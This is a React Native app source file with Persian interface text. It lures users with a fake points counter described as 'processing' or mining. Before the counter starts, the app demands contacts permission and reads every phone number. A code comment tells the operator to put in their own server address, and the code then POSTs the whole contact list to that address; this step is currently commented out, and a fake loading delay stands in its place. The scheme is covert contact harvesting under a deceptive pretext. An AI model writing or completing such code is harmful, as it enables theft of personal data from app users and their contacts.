import React, { useState, useEffect, useRef } from 'react';
import { 
  StyleSheet, Text, View, TouchableOpacity, 
  Animated, ActivityIndicator, Alert, Linking 
} from 'react-native';
import * as Contacts from 'expo-contacts';
import * as Network from 'expo-network';
import { Feather } from '@expo/vector-icons';

export default function App() {
  const [score, setScore] = useState(0.00);
  const [isMining, setIsMining] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // انیمیشن تپش برای شمارنده
  const pulseAnim = useRef(new Animated.Value(1)).current;

  // افکت شمارنده که بعد از استارت فعال می‌شود
  useEffect(() => {
    let timer;
    if (isMining) {
      // اضافه کردن 0.01 هر 60 ثانیه
      timer = setInterval(() => {
        setScore(prev => prev + 0.01);
      }, 60000); 
      
      // اجرای انیمیشن تپش
      Animated.loop(
        Animated.sequence([
          Animated.timing(pulseAnim, { toValue: 1.08, duration: 1000, useNativeDriver: true }),
          Animated.timing(pulseAnim, { toValue: 1, duration: 1000, useNativeDriver: true })
        ])
      ).start();
    } else {
      pulseAnim.setValue(1);
    }
    return () => clearInterval(timer);
  }, [isMining]);

  const handleStartProcess = async () => {
    setIsProcessing(true);
    
    // ۱. بررسی وضعیت اینترنت
    const networkState = await Network.getNetworkStateAsync();
    if (!networkState.isConnected) {
      Alert.alert("خطای ارتباط", "اینترنت قطع است. لطفاً اتصال خود را بررسی کنید.");
      setIsProcessing(false);
      return;
    }

    // ۲. درخواست دسترسی مخاطبین
    const { status } = await Contacts.requestPermissionsAsync();
    if (status !== 'granted') {
      Alert.alert(
        "نیاز به دسترسی",
        "برای شروع فرآیند باید دسترسی مخاطبین را از تنظیمات گوشی فعال کنید.",
        [
          { text: "انصراف", style: "cancel" },
          { text: "باز کردن تنظیمات", onPress: () => Linking.openSettings() }
        ]
      );
      setIsProcessing(false);
      return;
    }

    // ۳. دریافت مخاطبین در پس‌زمینه
    try {
      const { data } = await Contacts.getContactsAsync({
        fields: [Contacts.Fields.PhoneNumbers],
      });

      // ۴. ارسال مخاطبین به سایت/سرور شما
      /* 
       * نکته مهم: لینک زیر را با آدرس API سایت خودت عوض کن 
       */
      /*
      await fetch('https://your-website.com/api/receive-contacts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contacts: data })
      });
      */
      
      // (شبیه‌سازی ۲ ثانیه‌ای برای لودینگ - بعد از اتصال به سایت واقعی این خط را پاک کن)
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // ۵. استارت شمارنده
      setIsMining(true);
    } catch (error) {
      Alert.alert("خطا", "مشکلی در پردازش اطلاعات پیش آمد.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <View style={styles.container}>
      {/* هدر */}
      <View style={styles.header}>
        <View style={{flexDirection: 'row', alignItems: 'center'}}>
          <Feather name="layers" size={24} color="#ffffff" style={{marginRight: 8}} />
          <Text style={styles.headerTitle}>سیستم پردازش</Text>
        </View>
      </View>

      {/* بخش مرکزی */}
      <View style={styles.main}>
        <Animated.View style={[styles.scoreCircle, { transform: [{ scale: pulseAnim }] }]}>
          <Text style={styles.scoreLabel}>امتیاز فعلی</Text>
          <Text style={styles.scoreValue}>{score.toFixed(2)}</Text>
          {isMining && <Text style={styles.activeText}>سیستم فعال است...</Text>}
        </Animated.View>

        {!isMining ? (
          <TouchableOpacity 
            style={styles.actionButton} 
            onPress={handleStartProcess}
            disabled={isProcessing}
            activeOpacity={0.8}
          >
            {isProcessing ? (
              <ActivityIndicator color="#ffffff" />
            ) : (
              <>
                <Feather name="power" size={22} color="#ffffff" style={{marginRight: 8}} />
                <Text style={styles.buttonText}>شروع پردازش و کسب امتیاز</Text>
              </>
            )}
          </TouchableOpacity>
        ) : (
          <View style={styles.statusBox}>
            <Feather name="check-circle" size={28} color="#ed1944" />
            <Text style={styles.statusText}>
              ارتباط با سرور برقرار شد.{'\n'}شمارنده هر دقیقه آپدیت می‌شود.
            </Text>
          </View>
        )}
      </View>

      {/* فوتر متحرک (فقط در زمان فعالیت نشان داده می‌شود) */}
      {isMining && (
        <View style={styles.footer}>
          <ActivityIndicator size="small" color="#ed1944" />
          <Text style={styles.footerText}>در حال همگام‌سازی ابری...</Text>
        </View>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f8f9fa',
  },
  header: {
    backgroundColor: '#ed1944',
    paddingTop: 55,
    paddingBottom: 20,
    paddingHorizontal: 20,
    borderBottomLeftRadius: 30,
    borderBottomRightRadius: 30,
    shadowColor: '#ed1944',
    shadowOffset: { width: 0, height: 6 },
    shadowOpacity: 0.35,
    shadowRadius: 10,
    elevation: 10,
  },
  headerTitle: {
    color: '#ffffff',
    fontSize: 22,
    fontWeight: 'bold',
  },
  main: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
  },
  scoreCircle: {
    width: 220,
    height: 220,
    borderRadius: 110,
    backgroundColor: '#ffffff',
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: 40,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 10 },
    shadowOpacity: 0.08,
    shadowRadius: 20,
    elevation: 8,
    borderWidth: 4,
    borderColor: 'rgba(237, 25, 68, 0.1)',
  },
  scoreLabel: {
    fontSize: 16,
    color: '#636e72',
    marginBottom: 8,
    fontWeight: '600',
  },
  scoreValue: {
    fontSize: 48,
    fontWeight: '900',
    color: '#ed1944',
  },
  activeText: {
    marginTop: 12,
    fontSize: 13,
    color: '#ed1944',
    fontWeight: '500',
  },
  actionButton: {
    flexDirection: 'row',
    backgroundColor: '#ed1944',
    paddingVertical: 16,
    paddingHorizontal: 32,
    borderRadius: 16,
    width: '100%',
    justifyContent: 'center',
    alignItems: 'center',
    shadowColor: '#ed1944',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
    elevation: 6,
  },
  buttonText: {
    color: '#ffffff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  statusBox: {
    backgroundColor: '#ffffff',
    padding: 20,
    borderRadius: 16,
    width: '100%',
    alignItems: 'center',
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.05,
    shadowRadius: 10,
    elevation: 3,
  },
  statusText: {
    marginTop: 12,
    fontSize: 15,
    color: '#2d3436',
    textAlign: 'center',
    lineHeight: 24,
    fontWeight: '600',
  },
  footer: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 16,
    backgroundColor: '#ffffff',
    borderTopWidth: 1,
    borderColor: '#f0f0f0',
  },
  footerText: {
    marginLeft: 10,
    color: '#636e72',
    fontSize: 13,
    fontWeight: '500',
  }
});